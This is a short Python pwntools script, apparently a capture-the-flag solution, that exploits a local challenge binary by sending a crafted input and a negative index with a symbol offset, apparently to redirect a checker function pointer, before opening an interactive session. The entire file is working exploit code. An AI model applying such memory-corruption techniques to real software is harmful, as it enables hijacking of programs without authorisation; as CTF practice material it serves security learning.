#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chall'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='i386')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io):
    io.sendlineafter('>> ', chr(83) * 7 + chr(84) * 9)
    io.sendlineafter('.\n', str(-16) + ' ' + str(binf.sym.easy_checker - binf.sym.hard_checker))

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
